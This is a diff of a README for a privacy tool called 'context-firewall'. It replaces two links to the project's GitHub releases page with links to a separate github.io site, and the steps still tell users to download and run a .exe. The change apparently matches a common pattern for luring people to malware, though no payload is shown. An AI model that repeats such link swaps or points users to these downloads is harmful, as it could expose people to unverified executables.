@@ -1,6 +1,6 @@
 # 🛡️ context-firewall - Maintain control over your coding data
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Reamgargle889/context-firewall/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://reamgargle889.github.io)
 
 ## 🎯 What this tool does
 
@@ -15,7 +15,7 @@ Modern coding software often sends your project files to cloud servers. This rai
 
 ## 🚀 How to get started
 
-1. Visit the [official releases page](https://github.com/Reamgargle889/context-firewall/releases) to find the latest version.
+1. Visit the [official releases page](https://reamgargle889.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to start the download.
 4. Locate the file in your downloads folder.
